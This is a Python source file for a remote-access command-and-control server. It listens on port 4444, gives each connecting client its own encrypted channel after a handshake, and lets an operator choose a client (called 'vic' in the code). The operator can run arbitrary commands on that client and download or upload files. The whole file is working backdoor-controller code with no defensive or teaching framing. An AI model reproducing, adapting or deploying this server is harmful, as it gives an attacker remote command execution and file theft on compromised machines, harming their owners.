#!/usr/bin/env python3
import socket,os,sys
import threading,time
from interface import *
from encryption import encryptData,decryptData,sendFile

# Server configuration
HOST = '0.0.0.0'		# Listen on this host
PORT = 4444			# Main port to listen on
next_port = PORT				# Port for server thread
first_client = False			# Main server controller
connections = 0				# Main server client count
client_list = []				# List of clients
socket_list = []				# List of sockets
active = False			# Controls active client
dwld_mode = False			# Controls if downloading

# Check if host and address is in use
def CheckAddr(port):
	sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = False
	try:
		sc.bind((HOST, port))
		result = True
	except: result = False
	sc.close()
	return result

# Allocate an available port
def AllocPort():
	global next_port
	# Let's determine an available port for the new client
	while True:
		next_port += 1
		if CheckAddr(next_port): return next_port
		# Limit to 1000 clients
		if (next_port-PORT) > 1000: break

# Main server thread function
def MainServer():
	global first_client,connections
	connections += 1
	c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c.bind((HOST, PORT))
	c.listen(1)
	print('> Started main server: ' + str(HOST) + ' (' + str(PORT) + ') ' + str(connections) + ' times.')
	z,b = c.accept()
	print('> Client connected: ' + str(b))
	# Receive data
	data = z.recv(1024)
	try:
		decrypted = decryptData(data)
	except ValueError:
		print('> Decryption error.\n')
		pass
	if decrypted == 'Howdy!':
		print('> Starting new server thread.')
		portAV = AllocPort()
		z.send(encryptData('port ' + str(portAV)))
		sThread = threading.Thread(name='serverThread', target=ServerHandler, args=(HOST, int(portAV)), daemon=True)
		sThread.start()
		time.sleep(1)
		z.shutdown(socket.SHUT_RDWR)
		z.close()
		first_client = False
		sys.exit()

# Server threads for individual clients
def ServerHandler(host, port):
	global client_list,socket_list,dwld_mode
	try:
		d = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		d.bind((host, port))
		d.listen(1)
		s,a = d.accept()
		client_list += [a]
		socket_list += [s]
		Refresh(client_list)
		print('> Client connected: ' + str(a))
		while True:
			# Receive data
			try: data = s.recv(1024)
			except:
				killClient(a, s)
				sys.exit()
			# Check for download mode
			if dwld_mode:
				try:
					g = open(exec[9:], 'wb')
					g.write(data)
					s.settimeout(60)
					while True:
						l = s.recv(1024)
						try:
							if l.decode().endswith('EOFX') == True: break
						except: pass
						g.write(l)
					g.close()
				except:
					print('> Error downloading file.')
					dwld_mode = False
					s.send(encryptData('cd .'))
				s.settimeout(None)
				dwld_mode = False
				data = s.recv(1024)
			# Standard data decryption / print
			try:
				decrypted = decryptData(data)
			except ValueError:
				print('> Decryption error.\n')
				pass
			# Check for end of file / command
			if decrypted != "EOFX": 
				nextcmd = input('chat : ')
				s.send(encryptData(nextcmd))

	except:
		killClient(a, s)
		sys.exit()

# Kill a client if connection drops or any error
def killClient(letuple, sock):
	global client_list,socket_list
	if len(client_list):
		for x in range(0, len(client_list)): 
			if x < len(client_list) and client_list[x] == letuple: client_list.pop(x)
	if len(socket_list):
		for x in range(0, len(socket_list)): 
			if x < len(socket_list) and socket_list[x] == sock: 
				socket_list[x].shutdown(socket.SHUT_RDWR)
				socket_list[x].close()
				socket_list.pop(x)

while True:
	# Check if we should fire main server thread
	if first_client == False:
		mainServer = threading.Thread(name='mainServer', target=MainServer, daemon=True)
		mainServer.start()
		first_client = True

	# Here we'll control the individual clients
	try:
		Refresh(client_list)
		time.sleep(4)
	except KeyboardInterrupt:
		vic = input("Enter action: ")
		if int(vic) == 0: sys.exit()
		elif int(vic) == 1: Status(client_list, socket_list)
		elif int(vic) >= 2:
			active = True
			vic = int(vic) - 2
			s = socket_list[vic]
			print('\n> Activating client ' + str(client_list[vic]) + '\n') 
			while active:
				# Get next command
				exec = input("")
				print('------------------------------\n')
				if exec == '': pass
				# Send that $hit
				elif exec == 'quit':
					print('\nQuitting...')
					active = False
				# Check for quit
				elif exec == 'exit':
					s.send(encryptData('quit'))
					client_list.pop(vic)
					s.shutdown(socket.SHUT_RDWR)
					s.close()
					socket_list.pop(vic)
					time.sleep(4)
					active = False
				# Download file from client
				elif exec[:8] == 'download':
					dwld_mode = True
					s.send(encryptData(exec))
				# Upload file to client
				elif exec[:6] == 'upload':
					try:
						if os.path.isfile(str(exec[7:])):
							s.send(encryptData(exec))
							filemsg = sendFile(s, str(exec[7:]))
							print(filemsg)
						else: 
							s.send(encryptData('cd .'))
							print('> Error locating this file.')
					except:
						s.send(encryptData('cd .'))
						print('> Error: file not found.')
				else: s.send(encryptData(exec))